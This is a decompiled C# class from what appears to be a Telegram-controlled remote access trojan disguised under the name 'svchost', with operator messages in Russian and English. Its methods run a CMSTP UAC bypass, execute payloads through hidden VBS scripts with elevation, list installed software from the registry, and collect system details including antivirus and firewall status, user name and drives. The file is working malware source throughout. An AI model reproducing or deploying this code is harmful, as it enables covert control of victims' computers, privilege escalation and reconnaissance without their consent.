using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using svchost.Properties;
using TelegramBot.Main;

namespace TelegramBot
{
	// Token: 0x020000DE RID: 222
	public class Func
	{
		// Token: 0x060002C7 RID: 711 RVA: 0x00020E44 File Offset: 0x0001F044
		public static string GetWindowText(IntPtr hWnd)
		{
			int num = DLLImport.GetWindowTextLength(hWnd) + 1;
			StringBuilder stringBuilder = new StringBuilder(num);
			num = DLLImport.GetWindowText(hWnd, stringBuilder, num);
			return stringBuilder.ToString(0, num);
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060002C8 RID: 712 RVA: 0x00020E74 File Offset: 0x0001F074
		public static string Wait
		{
			get
			{
				int num = new Random().Next(1, Func.frase.Length);
				return Func.frase[num];
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060002C9 RID: 713 RVA: 0x00020E9C File Offset: 0x0001F09C
		public static string Back
		{
			get
			{
				int num = new Random().Next(1, Func.back.Length);
				return Func.back[num];
			}
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060002CA RID: 714 RVA: 0x00020EC4 File Offset: 0x0001F0C4
		public static string hello
		{
			get
			{
				int num = new Random().Next(1, Func.hi.Length);
				return Func.hi[num];
			}
		}

		// Token: 0x060002CB RID: 715 RVA: 0x00003011 File Offset: 0x00001211
		public static void Change(string path)
		{
			DLLImport.SystemParametersInfo(20, 0, path, 3);
		}

		// Token: 0x060002CC RID: 716 RVA: 0x0000301E File Offset: 0x0000121E
		public static void admRun(string path)
		{
			CMSTPBypass.Execute(path);
			Application.Exit();
		}

		// Token: 0x060002CD RID: 717 RVA: 0x00020EEC File Offset: 0x0001F0EC
		public static string Programms(bool mode)
		{
			if (mode)
			{
				List<string> list = new List<string>();
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				foreach (string name in registryKey.GetSubKeyNames())
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(name);
					list.Add((registryKey2.GetValue("DisplayName") as string) + "\n");
				}
				return string.Join(" ", list);
			}
			string text = Commands.directory + "log.txt";
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
			foreach (string name2 in registryKey3.GetSubKeyNames())
			{
				RegistryKey registryKey4 = registryKey3.OpenSubKey(name2);
				File.AppendAllText(text, (registryKey4.GetValue("DisplayName") as string) + "\n");
			}
			return text;
		}

		// Token: 0x060002CE RID: 718 RVA: 0x00020FD0 File Offset: 0x0001F1D0
		public static void Run(string path)
		{
			try
			{
				Random random = new Random();
				string text = Folders.hidenfolder + "\\" + random.Next(213687, 34987634).ToString() + ".vbs";
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.FileName = "cscript";
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.WorkingDirectory = Path.GetTempPath();
				if (Check.Acess)
				{
					File.AppendAllText(text, Resources.Run2.Replace("lmao", path));
					processStartInfo.Arguments = "//B //Nologo " + text;
					processStartInfo.Verb = "runas";
					Process.Start(processStartInfo);
				}
				else
				{
					File.AppendAllText(text, Resources.Run1.Replace("lmao", path));
					processStartInfo.Arguments = "//B //Nologo " + text;
					Process.Start(processStartInfo);
				}
			}
			catch
			{
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.WorkingDirectory = Path.GetTempPath();
				processStartInfo2.FileName = path;
				if (Check.Acess)
				{
					processStartInfo2.Verb = "runas";
				}
				Process.Start(processStartInfo2);
			}
		}

		// Token: 0x060002CF RID: 719 RVA: 0x00021104 File Offset: 0x0001F304
		public static string Copy(string path)
		{
			string extension = Path.GetExtension(path);
			int num = new Random().Next();
			string text = Program.cdpath + num + extension;
			new FileInfo(path).CopyTo(text, true);
			return text;
		}

		// Token: 0x060002D0 RID: 720 RVA: 0x0000302C File Offset: 0x0000122C
		public static string Name(string path)
		{
			return Path.GetFileName(path);
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x060002D1 RID: 721 RVA: 0x00021144 File Offset: 0x0001F344
		public static string Drives
		{
			get
			{
				string result;
				try
				{
					int num = 0;
					List<string> list = new List<string>();
					foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
					{
						if (driveInfo.DriveType == DriveType.Fixed && driveInfo.IsReady)
						{
							num++;
							double num2 = (double)(driveInfo.TotalSize / 1024L / 1024L);
							double num3 = (double)(driveInfo.TotalFreeSpace / 1024L / 1024L);
							list.Add(string.Concat(new string[]
							{
								num.ToString(),
								")  ",
								driveInfo.Name,
								"  :  Space => (All = ",
								num2.ToString("#,##"),
								"mb / Free = ",
								num3.ToString("#,##"),
								" mb)\nПереход: /cd_",
								driveInfo.Name.Replace(":\\", null),
								"\n"
							}));
						}
					}
					result = string.Join(" ", list);
				}
				catch
				{
					result = "N/A";
				}
				return result;
			}
		}

		// Token: 0x060002D2 RID: 722 RVA: 0x00003034 File Offset: 0x00001234
		public static bool Remove(string file, string folder)
		{
			if (File.Exists(file))
			{
				File.Move(file, folder);
				return true;
			}
			if (Directory.Exists(file))
			{
				Directory.Move(file, folder);
				return true;
			}
			return false;
		}

		// Token: 0x060002D3 RID: 723 RVA: 0x00021280 File Offset: 0x0001F480
		public static string FileInfo(string path)
		{
			FileInfo fileInfo = new FileInfo(path);
			string name = fileInfo.Name;
			string text = fileInfo.Extension;
			if (string.IsNullOrEmpty(text))
			{
				text = "Noone";
			}
			string fullName = fileInfo.FullName;
			string text2 = fileInfo.CreationTime.ToString("dddd,  dd MMMM yyyy");
			string text3 = fileInfo.LastWriteTime.ToString("dddd,  dd MMMM yyyy");
			string text4 = fileInfo.Length.ToString();
			string text5 = fileInfo.GetAccessControl().GetOwner(typeof(SecurityIdentifier)).Translate(typeof(NTAccount)).ToString();
			return string.Concat(new string[]
			{
				"Имя: ",
				name,
				"\nРасширение: ",
				text,
				"\nПолный путь: ",
				fullName,
				"\n\nДата создания файла:  ",
				text2,
				"\nДата изменения файла:  ",
				text3,
				"\n\nПринадлежит: ",
				text5,
				"\nВес: ",
				text4,
				" байт"
			});
		}

		// Token: 0x060002D4 RID: 724 RVA: 0x00021390 File Offset: 0x0001F590
		public static string DirInfo(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			string name = directoryInfo.Name;
			string fullName = directoryInfo.FullName;
			string text = directoryInfo.CreationTime.ToString("dddd,  dd MMMM yyyy");
			string text2 = directoryInfo.LastWriteTime.ToString("dddd,  dd MMMM yyyy");
			string text3 = directoryInfo.GetAccessControl().GetOwner(typeof(SecurityIdentifier)).Translate(typeof(NTAccount)).ToString();
			return string.Concat(new string[]
			{
				"Имя: ",
				name,
				"\nПринадлежит: ",
				text3,
				"\nПолный путь: ",
				fullName,
				"\n\nДата создания файла:  ",
				text,
				"\nДата изменения файла: info ",
				text2
			});
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x060002D5 RID: 725 RVA: 0x00021450 File Offset: 0x0001F650
		public static string Info
		{
			get
			{
				string text = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString();
				string machineName = Environment.MachineName;
				string text2 = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER").ToString();
				string text3 = Environment.SystemDirectory.ToString();
				string text4 = Environment.ProcessorCount.ToString();
				string text5 = Environment.UserName.ToString();
				string drives = Func.Drives;
				return string.Concat(new string[]
				{
					"Ну...\nЧто могу сказать (O.O)\n\nИмя компьютера: ",
					machineName,
					"\nМодель процессора: ",
					text2,
					"\nЧисло ядер у процессора: ",
					text4,
					"\nРазрядность процессора: ",
					text,
					"\nМодель видеокарты: ",
					Check.VideoController,
					"\nКол-во памяти у неё: ",
					Check.VideoMemory,
					"\n\nИмя пользователя: ",
					text5,
					"\nОперационная система: ",
					Check.OSName,
					"\nРазрядность системы: ",
					Check.Bit,
					"\nПуть к системному каталогу: ",
					text3,
					"\nАнтивирус: ",
					Check.AV,
					"\nФаервол: ",
					Check.Firewall,
					"\n\nДиски на компьютере: \n ",
					drives
				});
			}
		}

		// Token: 0x04000510 RID: 1296
		public static string[] frase = new string[]
		{
			"One second, homie...",
			"Wait, bro...",
			"Ща всё будет...",
			"Подожди чутка...",
			"Минуточку...",
			"Секунда...",
			"Дай мне пару секунд...",
			"Операция выполняется...\nПип-Буп-Пип"
		};

		// Token: 0x04000511 RID: 1297
		public static string[] back = new string[]
		{
			"Да без Б  ┐('～`;)┌",
			"Окей  ┐(￣～￣)┌ ",
			"Назад так назад  ¯＼_(ツ)_/¯ ",
			"Как хочешь  ヽ(ー_ー )ノ ",
			"Заднюю даёшь?  (≧▽≦)",
			"Тыж тут главный  ┐(︶▽︶)┌",
			"Как знаешь ╮(︶︿︶)╭",
			"Так и быть ┐( ˘ ､ ˘ )┌"
		};

		// Token: 0x04000512 RID: 1298
		public static string[] hi = new string[]
		{
			"(*´∀｀)ﾉ",
			"(*・ω・)ﾉ",
			"(￣▽￣)ノ",
			"(￣▽￣)/",
			"(o´▽`o)ﾉ"
		};
	}
}
